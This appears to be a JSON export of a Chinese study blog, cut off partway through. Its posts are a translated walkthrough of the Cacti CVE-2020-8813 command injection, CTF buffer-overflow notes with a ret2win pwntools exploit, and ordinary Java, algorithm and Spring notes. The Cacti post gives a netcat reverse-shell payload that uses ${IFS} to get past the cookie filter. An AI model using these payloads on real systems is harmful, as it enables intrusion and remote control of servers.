[{"title":"CVE-2020-8813","date":"2020-02-23T12:04:50.000Z","path":"2020/02/23/CVE-2020-8813/","text":"Cacti v1.2.8 在身份认证情况下的远程代码执行(CVE-2020-8813) (搬运，原文见底部链接) 原文见参考链接，这里只是日常练习翻译和学习，部分和原文不一样加入了自己的理解 Cacti摘要Cacti是一种利用RRDTool的数据存储和绘图功能设计的一个完整的网络绘图解决方案，他提供了快速的轮询器(poll)、高级图形模板和多种数据获取方法和开箱即用的用户管理功能。所有的这些都封装在一个直观且易于使用的接口中，这对于局域网以及具有上千台设备的复杂网络来说都是有意义的。 关于exploit 我通过分析Cacti主函数里的多个函数代码发现了这个漏洞，为了确保远程代码生效，需要联系多个因素，这个漏洞主要发生在攻击者尝试在名为”Cacti”的cookie变量注入恶意代码，而cookie变量在连接一些字符串后会被传递给shell_exec函数，但是当我验证的时候我遇到了一个问题——当我尝试操控cookie的值的时候，访问页面将会拒绝我。所以为了解决这个问题，我发现这个页面可以以”Guest“的方式接入(这样可以不需要身份认证)。所以我构造了自己的exploit链，先访问”Guest”页面(graph_realtime.php)，然后发送恶意请求在主机上执行恶意代码。 为了顺利达到目的，首先我需要发送一个请求到”user_admin.php”来启用realtime_graph,”Guest”特权然后发送恶意的请求到“graph_realtime.php”页面 graph_realtime.php 12345678910/* call poller */$graph_rrd = read_config_option('realtime_cache_path') . '/user_' . session_id() . '_lgi_' . get_request_var('local_graph_id') . '.png';$command = read_config_option('path_php_binary');$args = sprintf('poller_realtime.php --graph=%s --interval=%d --poller_id=' . session_id(), get_request_var('local_graph_id'), $graph_data_array['ds_step']);shell_exec(\"$command $args\"); /* construct the image name */$graph_data_array['export_realtime'] = $graph_rrd;$graph_data_array['output_flag'] = RRDTOOL_OUTPUT_GRAPH_DATA;$null_param = array(); 我们可以看到第3行和第4行，我们接收到一对参数并把它们连接在一起，还有一个get_request_var函数 html_utility.php 12345678910111213141516171819function get_request_var($name, $default = '') &#123; global $_CACTI_REQUEST; $log_validation = read_config_option('log_validation'); if (isset($_CACTI_REQUEST[$name])) &#123; return $_CACTI_REQUEST[$name]; &#125; elseif (isset_request_var($name)) &#123; if ($log_validation == 'on') &#123; html_log_input_error($name); &#125; set_request_var($name, $_REQUEST[$name]); return $_REQUEST[$name]; &#125; else &#123; return $default; &#125;&#125; 我们看到这个函数会通过另一个函数set_request_var来处理输入和设置参数的值 12345678function set_request_var($variable, $value) &#123; global $_CACTI_REQUEST; $_CACTI_REQUEST[$variable] = $value; $_REQUEST[$variable] = $value; $_POST[$variable] = $value; $_GET[$variable] = $value;&#125; 所以，回到我们的“graph_realtime.php”文件，我们可以看到我们可以控制的一对输入是 local_graph_id $graph_data_array[‘ds_step’]的值 但不幸的是，出于几个原因我们并不能那么做，首先我们注意到graph_realtime.php文件的171行使用了sprintf来处理输入，而且第一个参数graph被“local_graph_id”的值来填充了所以我们无法利用他!并且更不幸的是这个值会被函数“get_filter_request_var”过滤： html_utility.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102function get_filter_request_var($name, $filter = FILTER_VALIDATE_INT, $options = array()) &#123; if (isset_request_var($name)) &#123; if (isempty_request_var($name)) &#123; set_request_var($name, get_nfilter_request_var($name)); return get_request_var($name); &#125; elseif (get_nfilter_request_var($name) == 'undefined') &#123; if (isset($options['default'])) &#123; set_request_var($name, $options['default']); return $options['default']; &#125; else &#123; set_request_var($name, ''); return ''; &#125; &#125; else &#123; if (get_nfilter_request_var($name) == '0') &#123; $value = '0'; &#125; elseif (get_nfilter_request_var($name) == 'undefined') &#123; if (isset($options['default'])) &#123; $value = $options['default']; &#125; else &#123; $value = ''; &#125; &#125; elseif (isempty_request_var($name)) &#123; $value = ''; &#125; elseif ($filter == FILTER_VALIDATE_IS_REGEX) &#123; if (is_base64_encoded($_REQUEST[$name])) &#123; $_REQUEST[$name] = utf8_decode(base64_decode($_REQUEST[$name])); &#125; $valid = validate_is_regex($_REQUEST[$name]); if ($valid === true) &#123; $value = $_REQUEST[$name]; &#125; else &#123; $value = false; $custom_error = $valid; &#125; &#125; elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_ARRAY) &#123; $valid = true; if (is_array($_REQUEST[$name])) &#123; foreach($_REQUEST[$name] AS $number) &#123; if (!is_numeric($number)) &#123; $valid = false; break; &#125; &#125; &#125; else &#123; $valid = false; &#125; if ($valid == true) &#123; $value = $_REQUEST[$name]; &#125; else &#123; $value = false; &#125; &#125; elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_LIST) &#123; $valid = true; $values = preg_split('/,/', $_REQUEST[$name], NULL, PREG_SPLIT_NO_EMPTY); foreach($values AS $number) &#123; if (!is_numeric($number)) &#123; $valid = false; break; &#125; &#125; if ($valid == true) &#123; $value = $_REQUEST[$name]; &#125; else &#123; $value = false; &#125; &#125; elseif (!cacti_sizeof($options)) &#123; $value = filter_var($_REQUEST[$name], $filter); &#125; else &#123; $value = filter_var($_REQUEST[$name], $filter, $options); &#125; &#125; if ($value === false) &#123; if ($filter == FILTER_VALIDATE_IS_REGEX) &#123; $_SESSION['custom_error'] = __('The search term \"%s\" is not valid. Error is %s', html_escape(get_nfilter_request_var($name)), html_escape($custom_error)); set_request_var($name, ''); raise_message('custom_error'); &#125; else &#123; die_html_input_error($name, get_nfilter_request_var($name)); &#125; &#125; else &#123; set_request_var($name, $value); return $value; &#125; &#125; else &#123; if (isset($options['default'])) &#123; set_request_var($name, $options['default']); return $options['default']; &#125; else &#123; return; &#125; &#125;&#125; 这个函数将会过滤输入并返回一个干净的变量 并且第二个变量“$graph_data_array[‘ds_step’]”，也已经通过sprintf被处理成十进制了，所以没法用来注入恶意命令 所以我们要如何让事情变得可行呢?让我们再次查看代码 graph_realtime.php 123456789/* call poller */$graph_rrd = read_config_option('realtime_cache_path') . '/user_' . session_id() . '_lgi_' . get_request_var('local_graph_id') . '.png';$command = read_config_option('path_php_binary');$args = sprintf('poller_realtime.php --graph=%s --interval=%d --poller_id=' . session_id(), get_request_var('local_graph_id'), $graph_data_array['ds_step']);shell_exec(\"$command $args\"); /* construct the image name */$graph_data_array['export_realtime'] = $graph_rrd;$graph_data_array['output_flag'] = RRDTOOL_OUTPUT_GRAPH_DATA; 我们获得了另一个传递给shell_exec函数的变量——“session_id()”函数的值，这个函数会返回用户当前的session值，那意味着我们可以利用他来注入我们的命令。 但是如果我们操控session的值我们就无法访问页面因为页面需要用户认证才能访问，所以在一些额外的挖掘软件中我发现了，如果我们启用了“Realtime Graphs” 特殊权限，我们就可以作为”Guest”来访问页面 如果没有开启“Guest Realtime Graphs”访问权限： 如果开启 我们就可以访问到这个页面，现在就可以发送请求到“graph_realtime.php”了。 Payload Wirting 在控制了session值之后，我们需要使用它来获取系统上的代码执行环境，但这个值毕竟是session值，那意味着我们能用的字符受到了限制，所以我们需要编写session友好的Payload来避免注入时，应用将我们的cookie值强制替换 我们看到应用替换了我们的cookie值，已经不是我们注入的值了，为了解决这个问题我们需要使用定制的Payload。 为了避免使用空格，我想到了用“${IFS}”bash变量来替换空格，当然我们需要用;来转义命令，比如 1;payload 如果我们想使用netcat来获得一个shell，我们需要使用如下的payload 1;nc$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;ip$&#123;IFS&#125;port 参考链接https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/","tags":[{"name":"CVE","slug":"CVE","permalink":"http://yoursite.com/tags/CVE/"}]},{"title":"windows_hack","date":"2020-02-07T16:31:26.000Z","path":"2020/02/08/windows-hack/","text":"","tags":[]},{"title":"c++_primer","date":"2020-02-07T08:55:59.000Z","path":"2020/02/07/c-primer/","text":"","tags":[]},{"title":"pwn_new","date":"2019-12-21T12:40:56.000Z","path":"2019/12/21/pwn-new/","text":"知识 查看内存分布 1cat /proc/pid/maps 一般程序每次运行时，全局变量的地址不会变，栈和堆段的地址会变 eip：当前程序执行到哪一行 ipython计算padding长度 /dev/null（垃圾堆） 1r &lt; in &gt; /dev/null ltrace查看程序执行了哪些函数，执行了system只是缺少返回地址也就是栈帧平衡 1perl -e &apos;print &quot;A&quot;x116,&quot;\\x30\\x86\\x04\\x08&quot;&apos; | ltrace ./vul DEP：可以写的地方不能跑，可以跑的地方不能写 ASLR：每次执行的内存随机，无法预知地址 nc(v参数显示详细信息，k保持连接，l监听端口) 1ncat -vc ./vul -kl 127.0.0.1 8888 ni要跟到函数里面取，si不跟到函数里边去 x查看给定地址的内存，10个内存单元，w4字节，x以16进制形式 1x/10wx $esp 运行pidof vul没有进程，但是运行脚本后却有，nc语句只是监听端口，当有人连接上了才运行程序 调试操作 gdb打开一个程序，此时可以下断点，attach到一个进程，这个是远程的，根据本地的源代码决定断点下在哪里。 检查指令是否得到执行 无穷循环 1\\xeb\\xfe Illegal instruction 1\\xff\\xff\\xff 如果只是一般的字符串崩溃后显示的是Segmentation fault 用来代替全局变量的地址 1cat /proc/pid/maps 得到的地址一般从0x0804a000起，因为这个地方一般用来存全局变量，但是里面可能也会有些重要的数据，所以找靠后的地址 strace查看程序启用了哪些系统调用 0x80系统调用 1enhex(asm('int 0x80')) shellcode截断问题 1asm(&apos;mov eax,11\\n int 0x80&apos;) 12xor eax,eaxmov al,11 12push 11pop eax ROP Emporiumret2win 分析 开启了NX，栈上数据不可执行 用IDA查看一下 123456789101112char *pwnme()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); puts( \"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\\n\" \"What could possibly go wrong?\"); puts(\"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\\n\"); printf(\"&gt; \"); return fgets(&amp;s, 50, stdin);&#125; 程序分配了32字节的空间，但fgets可以接收的数据大于这个值（读到\\n、n-1个字符、文件末尾时结束），所以会造成栈溢出，我们的目的是查看flag.txt IDA查看到程序里有现成的函数可以利用，虽然正常情况下，这个函数不会执行 12345int ret2win()&#123; printf(\"Thank you! Here's your flag:\"); return system(\"/bin/cat flag.txt\");&#125; 利用缓冲区溢出，覆盖原本的返回地址，让他跳到ret2win函数执行 这里主要记录一下调试的细节 首先下断点，我下在了pwnme函数结尾处（0x08048658），也就是程序接收我们的输入后就停下 12345.text:0804864E call _fgets.text:08048653 add esp, 10h.text:08048656 nop.text:08048657 leave.text:08048658 retn gdb启动进程，下好断点 1234567from pwn import *r = process('./ret2win32')gdb.attach(r,'b *0x80485d4\\n')payload = cyclic(100)pause()r.sendline(payload)r.interactive() 弹出gdb调试窗口后backtrace一下，可以看到已经执行到fgets了，进程已启动就跑到这里了，所以断点只能下在fgets的后面。 1234567891011121314151617181920#0 0xf7ef7079 in __kernel_vsyscall ()#1 0xf7de0cd7 in __GI___libc_read (fd=0x0, buf=0x9ed2160, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:27#2 0xf7d6d188 in _IO_new_file_underflow (fp=&lt;optimized out&gt;) at fileops.c:531#3 0xf7d6e2ab in __GI__IO_default_uflow (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;) at genops.c:380#4 0xf7d61151 in __GI__IO_getline_info (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;, buf=&lt;optimized out&gt;, n=0x31, delim=0xa, extract_delim=0x1, eof=0x0) at iogetline.c:60#5 0xf7d6129e in __GI__IO_getline (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;, buf=0xfffb6cd0 &quot;&quot;, n=0x31, delim=0xa, extract_delim=0x1) at iogetline.c:34#6 0xf7d6004c in _IO_fgets (buf=0xfffb6cd0 &quot;&quot;, n=0x32, fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;) at iofgets.c:53#7 0x08048653 in pwnme ()#8 0x080485d9 in main ()#9 0xf7d12e81 in __libc_start_main (main=0x804857b &lt;main&gt;, argc=0x1, argv=0xfffb6db4, init=0x8048690 &lt;__libc_csu_init&gt;, fini=0x80486f0 &lt;__libc_csu_fini&gt;, rtld_fini=0xf7f079b0 &lt;_dl_fini&gt;, stack_end=0xfffb6dac) at ../csu/libc-start.c:310#10 0x080484a1 in _start () 然后gdb，continue一下，脚本pause一下发送数据，看到停在了ret指令处，此时栈顶的内容，存放的是即将返回的地址 可以看到栈顶被覆盖成了laaa这4个字节 我们用ipython计算一下 也就是说我们输入44个字符后，接下来的4个字节会被当做函数的返回地址，所以我们将他覆盖成ret2win的地址即可 exploit 123456789from pwn import *r = process('./ret2win32')# gdb.attach(r,'b *0x08048658')# payload = cyclic(100)# pause()ret2win = 0x08048659payload = 'A'*44+p32(ret2win)r.sendline(payload)r.interactive() 可以验证一下，下个断点在这里，看到返回地址确实被覆盖成了ret2win的地址 ret2win与前面一样不过是变成64位的了","tags":[{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"security","date":"2019-11-13T12:22:56.000Z","path":"2019/11/13/security/","text":"主流的加密方式及其应用RSA 原理：","tags":[]},{"title":"Design_pattern","date":"2019-09-21T12:49:47.000Z","path":"2019/09/21/Design-pattern/","text":"设计模式七大原则 单一职责：每个方法、每个类、每个框架只做一件事 开闭原则： 对扩展开放 对修改关闭 接口隔离原则 类似单一职责，不依赖于它不需要的接口 依赖倒置原则 强调的是针对接口的编程，当下层剧烈变动的时候，上层无感知。 上层：调用其他方法的 下层：被其他方法调用的 上层不能依赖于下层，他们都应该依赖于抽象 迪米特法则 最少知道原则，一个类，对于其他类，要知道的越少越好，只和朋友通信。 类中的字段是朋友 方法的参数是朋友 方法的返回值是朋友 方法中实例化出来的对象 里氏替换原则： 任何能使用父类对象的地方，都应该能透明的替换为子类对象，也就是说字类对象可以随时地替换父类对象，业务逻辑不变，且不会报错。 组合优于继承： 如果是父类作者，和子类的作者，不是同一个人，就别继承 如果父类作者和字类作者是同一个人，那就可以继承 类与类之间的关系 B继承A：B指向A的实线三角 B实现接口A：B指向A的虚线三角 B关联A：B里创建A的实例，B指向A的实线箭头 (1) 组合：关系强，失去A不会破坏B的结构，菱形为空 (2) 聚合：关系弱，失去A会破坏B的结构，菱形为实心 B依赖A：A是B里的局部变量，B-&gt;A的虚线箭头 模式 工厂模式 针对服务器端代码一旦修改，客户端代码也要跟着修改，可以用设计模式，面向接口编程（此处的接口是工厂）。 简单工厂的优点，把具体产品的类型，从客户端代码中解耦出来；服务器端如果修改了具体产品类名，客户端也知道。 简单工厂的缺点，客户端不得不死记硬背具体产品的映射关系，如果具体产品特别多，则简单工厂就会变得十分臃肿，最重要的是，变化来了，客户端需要扩展具体产品的时候，势必要更改简单工厂中的代码，解耦是对已有的产品解耦。 产品：类的实例 抽象产品：抽象类、接口 工厂方法 当需要扩展时，简单工厂模式需要修改代码，而工厂方法是扩展一个产品的时候也扩展扩展方法 优点：仍然具有简单工厂的优点：服务器修改了具体产品的类名后，客户端不知道 当客户端需要扩展一个新产品时，不需要修改作者原来的代码，只是扩展一个新的工厂而已 是","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"设计模式","slug":"设计模式","permalink":"http://yoursite.com/tags/设计模式/"}]},{"title":"Algorithm","date":"2019-09-14T05:14:18.000Z","path":"2019/09/14/Algorithm/","text":"工具 交换方法 123456//交换方法 public static void swap(int a[],int index1,int index2)&#123; int tmp = a[index1]; a[index1] = a[index2]; a[index2] = tmp; &#125; 排序对数器 1234//排序对数器 public static void rightMethod(int a[])&#123; Arrays.sort(a); &#125; 生成随机数组 12345678910//生成随机数组 public static int[] generateRandomArray(int maxSize, int maxValue) &#123; //生成一个数组，长度是随机的 int[] arr = new int[(int) ((maxSize + 1) * Math.random())]; for (int i = 0; i &lt; arr.length; i++) &#123; //每一个数是随机的 arr[i] = (int) ((maxValue + 1) * Math.random()) - (int) (maxValue * Math.random()); &#125; return arr; &#125; 数组拷贝 123456789//数组拷贝 public static int[]copyArray(int[]arr)&#123; if (arr==null) return null; int[]res = new int[arr.length]; for (int i=0;i&lt;arr.length;i++)&#123; res[i]=arr[i]; &#125; return res; &#125; 数组判断相等 123456789101112131415161718//数组判断相等 public static boolean isEqual(int[] arr1, int[] arr2) &#123; if ((arr1 == null &amp;&amp; arr2 != null) || (arr1 != null &amp;&amp; arr2 == null)) &#123; return false; &#125; if (arr1 == null &amp;&amp; arr2 == null) &#123; return true; &#125; if (arr1.length != arr2.length) &#123; return false; &#125; for (int i = 0; i &lt; arr1.length; i++) &#123; if (arr1[i] != arr2[i]) &#123; return false; &#125; &#125; return true; &#125; 打印数组 12345678910//打印数组 public static void printArray(int[] arr) &#123; if (arr == null) &#123; return; &#125; for (int i = 0; i &lt; arr.length; i++) &#123; System.out.print(arr[i] + \" \"); &#125; System.out.println(); &#125; 排序 冒泡排序 原理：从第一个位置开始，比较这一个位置和下一个位置数的大小，如果这一个位置数更大，就和下个位置的数交换，一轮下来保证n个数中最大的数到大最后，下一轮完成后剩下的n-1个数中最大的数到达倒数第二个位置。 代码： 12345678910111213//冒泡排序 public static void bubbleSort(int a[])&#123; if (a==null||a.length&lt;2) return; //最外层表示这一轮要确定第几个位置的数 for (int end=a.length-1;end&gt;0;end--)&#123; //内层循环依次比较并交换相邻位置的数 for (int i =0;i&lt;end;i++)&#123; if (a[i]&gt;a[i+1])&#123; Tool.swap(a,i,i+1); &#125; &#125; &#125; &#125; 时间复杂度：O(n^2^) 空间复杂度：O(1) 选择排序 原理：每次遍历找出剩下的数中最小的数放在对应位置，每次遍历的时候前i个数有序 代码： 123456789101112131415161718public static void selectionSort(int arr[])&#123; if (arr==null||arr.length&lt;2)&#123; return; &#125; //外层循环从第1个位置到第n-1个位置 for (int i=0;i&lt;arr.length-1;i++)&#123; int minIndex = i; //内层循环从第2个位置到第n个位置 for (int j =i+1;j&lt;arr.length;j++)&#123; //满足条件，记录下标 if (arr[j]&lt;arr[minIndex])&#123; minIndex = j; &#125; &#125; //内层结束，交换 Tool.swap(arr,i,minIndex); &#125; &#125; 时间复杂度：O(n^2^) 空间复杂度：O(1) 插入排序 原理：从第i个数开始遍历将更小的数插入前面的有序数组中 代码： 12345678public static void insertSort(int arr[])&#123; if (arr==null||arr.length&lt;2) return; for(int i=1;i&lt;arr.length;i++)&#123; for (int j=i-1;j&gt;=0;j--)&#123; if (arr[j]&gt;arr[j+1]) Tool.swap(arr,j,j+1); &#125; &#125; &#125; 时间复杂度：O(n^2^) 空间复杂度：O(1) 归并排序 原理：分为递归和合并两个部分，递归是为了将大数组分解为两个小数组，合并就是排序的过程 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public static void mergeSort(int arr[])&#123; if (arr==null||arr.length&lt;2) return; sort(arr,0,arr.length-1); &#125;//归并排序 public static void sort(int arr[],int l,int r)&#123; if (l==r) return; //切一半 int mid = l + ((r-l)&gt;&gt;1); //左边递归 sort(arr,l,mid); //右边递归 sort(arr,mid+1,r); //合并 merge(arr,l,r,mid); &#125;//合并 public static void merge(int arr[],int l,int r,int mid)&#123; //定义一个新的数组，数组长度和这一轮递归的l和r有关 int []res = new int[r-l+1]; int p1 = l; int p2 = mid+1; int i = 0; //排序、移动下标 while(p1 &lt;= mid &amp;&amp; p2 &lt;= r)&#123; if (arr[p1]&lt;arr[p2])&#123; res[i++] = arr[p1++]; &#125; else &#123; res[i++] = arr[p2++]; &#125; &#125; //当其中一边先移动完成，另一边直接复制，因为是有序的 while (p1&lt;=mid)&#123; res[i++] = arr[p1++]; &#125; while (p2&lt;=r)&#123; res[i++] = arr[p2++]; &#125; //因为传递的是引用，所以直接在这里改动原来的数组，以l作为起始位置即可。 for (int j =0;j&lt;res.length;j++)&#123; arr[l+j] = res[j]; &#125; &#125; 时间复杂度：O(log2n)，用master公式计算 空间复杂度：O(n)，数据有多少就要多少额外空间装 归并排序的应用：求一组数每个数左边的比它小的数的总和 原理：每次合并的同时会进行比较，此时就可以记下最小和并返回。注意这里产生最小和的细节是，将题目转化为，只要右边有一个数比自己大，那么最小和的值就加上自己本身 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class SmallSum &#123; public static int smallSum(int arr[])&#123; if (arr == null) return 0; return recursive(arr,0,arr.length-1); &#125; public static int recursive(int arr[],int l,int r)&#123; if (l==r) return 0; int mid = l + ((r-l) &gt;&gt; 1); return //左边递归会产生最小和,右边递归会产生最小和,此次合并会产生最小和 recursive(arr,l,mid)+recursive(arr,mid+1,r)+merge(arr,l,r,mid); &#125; public static int merge(int arr[],int l,int r,int mid)&#123; int p1 = l; int p2 = mid+1; int res = 0; int i = 0; int[]tmp = new int[r-l+1]; while(p1 &lt;= mid &amp;&amp; p2 &lt;= r)&#123; res += arr[p1] &lt; arr[p2]?arr[p1]*(r-p2+1):0; tmp[i++] = arr[p1] &lt; arr[p2]?arr[p1++]:arr[p2++]; &#125; while(p1 &lt;= mid)&#123; tmp[i++] = arr[p1++]; &#125; while(p2 &lt;= r)&#123; tmp[i++] = arr[p2++]; &#125; for (i=0;i&lt;tmp.length;i++)&#123; arr[l+i] = tmp[i]; &#125; return res; &#125; public static void main(String[] args) &#123; int arr[] = &#123;4,1,3,5,0,6&#125;; System.out.println(smallSum(arr)); &#125;&#125; 快速排序： 原理：先选择一个数作为标准（一般为最后一个数），基于这个数将整个数组分成三个部分小于区，大于区，等于区；这个步骤由递归实现，每次递归返回等于区的范围，基于等于区来进行下一次递归 代码: 12345678910111213141516171819public class Partion2 &#123; public static int[] partion2(int arr[],int L,int R)&#123; int less = L-1;//小于区域 int more = R;//大于区域 while (L != more)&#123; if (arr[L] &lt; arr[R])&#123; Tool.swap(arr,++less,L++); &#125; else if (arr[L]&gt;arr[R])&#123; Tool.swap(arr,--more,L); &#125; else&#123; L++; &#125; &#125; Tool.swap(arr,R,L); return new int[]&#123;less+1,more&#125;; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738public class QuickSort &#123; public static void quickSort(int arr[])&#123; if (arr==null||arr.length&lt;2) return; sort(arr,0,arr.length-1); &#125; public static void sort(int arr[],int L,int R)&#123; if (L &lt; R)&#123; Tool.swap(arr,(int) (L+Math.random()*(R-L+1)),R); int range[] = Partion2.partion2(arr,L,R); sort(arr,L,range[0]-1); sort(arr,range[1]+1,R); &#125; &#125; public static void main(String[] args) &#123; int testTime = 20; int maxSize = 50; int maxValue = 50; boolean succeed = true; for (int i=0;i&lt;testTime;i++)&#123; int[] arr1=Tool.generateRandomArray(maxSize,maxValue); int[] arr2=Tool.copyArray(arr1); Tool.rightMethod(arr1); quickSort(arr2); if (!Tool.isEqual(arr1,arr2))&#123; succeed=false; break; &#125; &#125; System.out.println(succeed ? \"结果正确\":\"结果不正确\"); int[] arr = Tool.generateRandomArray(maxSize, maxValue); Tool.printArray(arr); quickSort(arr); Tool.printArray(arr); &#125;&#125; 杂项 质因数分解 递归实现 对于范围从2到number的每个数，看他是否能整除number，如果能整除那么这个数就是一个素因子，number除以这个数后递归。 1234567891011121314//递归方式实现 public static void solve1(int number) &#123; for(int i=2;i&lt;=number;i++) &#123; if(i==number) &#123; System.out.println(number); return; &#125; if ((number%i==0)) &#123; System.out.println(i); solve1(number/i); break; &#125; &#125; &#125; 非递归实现 对于每个从2到number的数，通过循环判断是否能整除number，如果能整除，就除以这个数后加到列表中。 12345678910111213141516public static void solve2(int number) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for(int i=2;i&lt;=number;i++) &#123; while(number!=i) &#123; if ((number%i)!=0) &#123; break; &#125; list.add(Integer.valueOf(i)); number = number/i; &#125; &#125; list.add(Integer.valueOf(number)); for(Integer integer:list) &#123; System.out.println(integer.intValue()); &#125; &#125; Eratosthenes筛选法 原理：如果n不是素数，那么n的素因子一定小于n开根号 12345678910111213public static void solve3(int number) &#123; int i=2; while(i*i&lt;=number) &#123; while(number%i==0) &#123; System.out.println(i); number=number/i; &#125; i++; &#125; if (number&gt;1) &#123; System.out.println(number); &#125; &#125; Loading 剑指offer刷题记录（JAVA实现）","tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://yoursite.com/tags/Algorithm/"}]},{"title":"","date":"2019-09-11T09:24:38.000Z","path":"2019/09/11/JavaSpring/","text":"Spring概述 什么是Spring Spring是一个开放源代码的设计层面框架，他解决的是业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用。 Spring是于2003 年兴起的一个轻量级的Java 开发框架 简单来说，Spring是一个分层的JavaSE/EE full-stack(一站式) 轻量级开源框架。 IOC 什么是IOC IOC又叫控制反转，将对象的创建权力反交给Spring 传统开发模式 业务和实现类过于紧密，底层业务更改要修改源代码 通过工厂可以实现接口和业务的分离 在工厂内部使用配置文件加载（解析XML-&gt;反射创建对象-&gt;返回对象） Spring-IOC的使用 添加JAR包 创建配置文件 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"userDao\" class=\"demo1.UserDaoOracleImpl\"&gt; &lt;!-- name:要注入的属性名称 value:注入(赋值)的值 属性:要提供set方法 --&gt; &lt;property name=\"name\" value=\"lk123456\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 一个&lt;bean&gt;&lt;/bean&gt;标签里管理一个类的对象 id属性是用于获取对象的唯一标识 class属性是获取哪个类的对象 测试使用 接口 123456package demo1;public interface UserDao &#123; public void save(); public void delete();&#125; 接口实现类UserDaoOracleImpl 12345678910111213141516171819package demo1;public class UserDaoOracleImpl implements UserDao &#123; public String name; public void setName(String name) &#123; this.name = name; &#125; @Override public void save() &#123; System.out.println(\"oracle-save\"); &#125; @Override public void delete() &#123; System.out.println(\"oracle-delete\"); &#125;&#125; 12345678910111213141516171819package demo1;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class UserTest &#123; @Test public void test()&#123; //spring //1.加载配置文件 ApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); //2.根据id获取对象 UserDao userDao = (UserDao) applicationContext.getBean(\"userDao\"); userDao.save(); userDao.delete(); &#125;&#125; 使用的时候我们用接口类的来创建对象，假如我们想更改实现方式，只需实新的类以及修改配置文件即可，不需要修改实现的代码。 DI 依赖注入 给spring管理类当中依赖的属性,通过配置文件进行赋值的过程 传统方式 123456public void test2()&#123; //传统 UserDaoOracleImpl userDaoOracle = new UserDaoOracleImpl(); userDaoOracle.name = \"lk\"; System.out.println(userDaoOracle.name); &#125; 使用面向接口的编程方式没有办法设置属性值 DI方式 实现类当中的属性要提供set方法 在配置文件当中配置依赖注入 通过property标签设置 12345678&lt;bean id=\"userDao\" class=\"demo1.UserDaoOracleImpl\"&gt; &lt;!-- name:要注入的属性名称 value:注入(赋值)的值 属性:要提供set方法 --&gt; &lt;property name=\"name\" value=\"lk123456\"/&gt; &lt;/bean&gt; Bean相关配置 名称与标识： id：使用了约束中的唯一约束。里面不能出现特殊字符的 name：没有使用约束中的唯一约束。里面可以出现特殊字符。 设置对象的生命周期方法 init-method：Bean被初始化的时候执行的方法 destroy-method：Bean被销毁的时候执行的方法（Bean是单例创建，工厂关闭） 123&lt;bean id=\"person\" class=\"demo2.Person\" init-method=\"init\" destroy-method=\"destroy\" scope=\"prototype\"&gt; &lt;property name=\"name\" value=\"faint-star\"/&gt;&lt;/bean&gt; 当加载配置文件时调用init-method，当关闭工厂时调用destroy-method 1234567891011public class PersonTest &#123; @Test public void test()&#123; //加载核心配置文件(此时创建实例，执行init方法，创建文件里的所有对象) ClassPathXmlApplicationContext classPathXmlApplicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); Person person = (Person) classPathXmlApplicationContext.getBean(\"person\"); System.out.println(person.name); //关闭工厂,所有对象都会销毁----单例 classPathXmlApplicationContext.close(); &#125;&#125; Bean的作用范围的配置 singleton：默认的，Spring会采用单例模式创建这个对象。 prototype：多例模式。 request：应用在web项目中，Spring创建这个类以后，将这个对象存入到request范围中。 session：应用在web项目中，Spring创建这个类以后，将这个对象存入到session范围中 globalsession：应用在web项目中，必须在porlet(基于Java的Web组件，子域名)环境下使用。但是如果没有这种环境，相对于session。 工厂实例化的方式 无参构造-默认 只需提供一个默认构造函数即可 静态工厂实例化 1&lt;bean id=\"user\" class=\"demo3.User\" factory-method=\"createUser\"&gt;&lt;/bean&gt; 123456789101112131415package demo3;import javax.jws.soap.SOAPBinding;public class User &#123;// public User()&#123;// super();// System.out.println(\"默认构造方法\");// &#125; public static User createUser()&#123; System.out.println(\"调用了createUser\"); //必须返回对象 return new User(); &#125;&#125; 分模块配置 在加载时，添加多个配置文件名称 在一个配置文件当中引入另一个配置文件 12&lt;!--导入另外的配置文件--&gt; &lt;import resource=\"applicationContext2.xml\"/&gt; Spring属性注入 构造方法方式属性注入 待注入类中实现一个带参数的构造方法 1234public Student(String name,Integer age)&#123; this.name=name; this.age=age; &#125; bean中配置 12&lt;constructor-arg name=\"name\" value=\"潘星波\"/&gt;&lt;constructor-arg name=\"age\" value=\"10\"/&gt; Set方法的属性注入 待注入类中给待注入的参数实现set方法 bean中配置 1&lt;property name=\"name\" value=\"faint-star\"/&gt; P名称空间的属性注入 使用p名称空间，就不需要写那那么多的property 使用时，要添加名称空间 1xmlns:p=\"http://www.springframework.org/schema/p\" bean中配置 1&lt;bean id=\"dog\" class=\"demo4.Dog\" p:age=\"10\" p:name=\"wc\" p:color=\"red\"&gt;&lt;/bean&gt; 集合类型注入 数组、List、Map、Set都要先定义set方发 数组bean中配置 12345678&lt;!--数组--&gt; &lt;property 